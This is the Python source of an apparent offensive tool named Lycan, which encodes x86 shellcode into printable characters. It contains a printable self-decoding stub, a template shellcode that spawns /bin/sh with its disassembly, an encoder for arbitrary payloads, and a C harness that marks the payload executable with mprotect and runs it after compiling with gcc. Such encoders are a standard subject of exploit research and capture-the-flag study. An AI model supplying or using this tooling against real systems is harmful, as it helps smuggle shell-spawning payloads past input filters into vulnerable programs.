import argparse
import sys
import os

decoder = """``P^j^XPY4^P]H4^PZ0Vv0Vw0Nx0Vz0V!,v`0V!0V"0V$0V%0N&0V(0V/0V00V20V30N40V60V=0V>0VA0VB0VE0VH0VI0NJ0VK0VU0VZ0NZV_UXP[2^\C`BL1yU[2^]C!B?`BR1yU[2^^C!B?`BX1yU[2^_C!B?1y)G^)g]`IN)G\GGGFFFF!~\&uLa"""
# 188 bytes total

template_shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"
# xor    %eax,%eax
# push   %eax
# push   $0x68732f2f
# push   $0x6e69622f
# mov    %esp,%ebx
# push   %eax
# push   %ebx
# mov    %esp,%ecx
# mov    $0xb,%al
# xor    %ecx,%ecx
# xor    %edx,%edx
# int    $0x80

template_c_code = """
# include <sys/mman.h>

char shellcode[] = "{shellcode}";

int main() {{ 
    mprotect((void *)((int)shellcode & ~4095), 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
    (*(int (*)())shellcode)();
    return 0;
}}
"""


def encode(p: bytes) -> str:
    if len(p) % 3 != 0:
        p = p + (3 - len(p) % 3) * b"\x90"
    e = ""
    for i in range(len(p) // 3):
        e += chr((p[3 * i] >> 2) + 0x3F)
        e += chr(((p[3 * i] & 0b11) << 4) + (p[3 * i + 1] >> 4) + 0x3F)
        e += chr(((p[3 * i + 1] & 0b1111) << 2) + (p[3 * i + 2] >> 6) + 0x3F)
        e += chr((p[3 * i + 2] & 0b111111) + 0x3F)
    return decoder + e + "&"


def hexlify(e: str) -> str:
    res = ""
    for i in e:
        res += "\\x" + hex(ord(i))[2:]
    return res


def generateTemplate(e: str):
    temp = template_c_code.format(shellcode=hexlify(e))
    with open("temp.c", "w") as f:
        f.write(temp)
    os.system("gcc -m32 -o temp temp.c")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="Lycan", formatter_class=argparse.RawTextHelpFormatter,
                                     description="Lycan -- a tool that implements the least information redundancy algorithm of printable shellcode encoding for x86",
                                     epilog="Example:\npython3 Lycan.py -e \"\\xde\\xad\\xbe\\xef\"" +
                                     "\npython3 Lycan.py -H -g -e \\xde\\xad\\xbe\\xef" +
                                     "\npython3 Lycan.py -H -e 'DeadBeef'" +
                                     "\npython3 Lycan.py -g -t")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-e", "--encode", default="", metavar="", type=str,
                       help="encode the original shellcode")
    group.add_argument("-t", "--template", default=False, metavar="", action=argparse.BooleanOptionalAction,
                       help="use the Lycan's default template shellcode")
    parser.add_argument("-H", "--hex", default=False, metavar="", action=argparse.BooleanOptionalAction,
                        help="output the encoded shellocode in hex format")
    parser.add_argument("-g", "--generate", default=False, metavar="", action=argparse.BooleanOptionalAction,
                        help="generate template C code in `temp.c` and compile it to `temp`")
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    if args.template:
        plain = template_shellcode
    else:
        plain = args.encode
        plain = bytes.fromhex(plain.replace("\\", "").replace("x", ""))

    encooded_bytes = encode(plain)
    if args.hex:
        print(hexlify(encooded_bytes))
    else:
        print(encooded_bytes)
    if args.generate:
        generateTemplate(encooded_bytes)
